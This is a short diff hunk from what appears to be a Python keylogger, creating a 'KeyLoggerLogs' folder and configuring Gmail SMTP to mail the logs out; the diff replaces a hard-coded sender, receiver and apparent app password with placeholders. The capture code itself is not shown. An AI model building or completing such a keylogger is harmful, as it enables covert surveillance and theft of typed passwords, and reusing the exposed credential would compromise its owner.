@@ -30,9 +30,9 @@ log_dir = os.path.join(desktop_path, "KeyLoggerLogs")
 os.makedirs(log_dir, exist_ok=True)
 
 # Email configuration
-sender_email = "logger123445@gmail.com"
-receiver_email = "jeandre7803@gmail.com"
-email_password = "nzvyakgbwyrjznuh"
+sender_email = "-----"
+receiver_email = "-----"
+email_password = "-----"
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
 
